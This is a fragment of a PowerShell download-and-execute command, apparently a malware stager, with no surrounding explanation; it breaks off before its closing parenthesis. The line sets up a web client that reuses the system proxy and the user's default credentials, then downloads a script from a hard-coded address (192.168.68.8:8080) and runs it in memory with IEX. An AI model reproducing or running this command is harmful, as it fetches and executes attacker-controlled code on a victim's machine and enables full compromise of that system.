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q=new-object net.webclient;if([System.Net.WebProxy]::GetDefaultProxy().address -ne $null){$q.proxy=[Net.WebRequest]::GetSystemWebProxy();$q.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;};IEX ((new-object Net.WebClient).DownloadString('http://192.168.68.8:8080/k4y6hID2Ow8SS'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